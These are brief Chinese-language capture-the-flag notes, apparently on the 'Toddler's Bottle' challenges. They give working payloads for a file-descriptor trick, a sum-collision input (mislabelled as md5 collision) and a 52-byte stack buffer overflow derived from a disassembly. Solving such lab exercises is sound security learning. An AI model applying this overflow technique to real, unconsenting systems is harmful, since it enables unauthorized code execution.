# Toddler's Bottle
## fd
1. 從fd讀取32byte到buf, buf == "LETMEWIN"  
2. fd = atoi(argv[1]) - 0x1234
=> fd = 0(stdin) = 4660 - 0x1234
payload = 4660

## collision
md5 collision  
題目要求password的總和 == 0x21DD09EC  
0x21DD09EC / 5 = 0x6c5cec8 * 4 + 0x6c5cecc
payload = "\xc8\xce\xc5\x06" * 4 + "\xcc\xce\xc5\x06"

## bof
最基本bof  
disassemble:
```
0x00000649    8d45d4       lea eax, [ebp-0x2c]
0x0000064c    890424       mov [esp], eax
0x0000064f    e8fcffffff   call 0x100000650 ; get
0x00000654    817d08bebaf. cmp dword [ebp+0x8], 0xcafebabe
```
可以看到get到ebp-0x2c, 而密碼在ebp+0x8  
因此offset = 0x2c+0x8 = 0x34 = 52
payload = "A"*52+p32(0xcafebabe)

## flag
這題提示很清楚，程式會malloc一段記憶體，並使用strcpy複製flag到記憶體中，因此只要使用gdb很容易就能看到flag


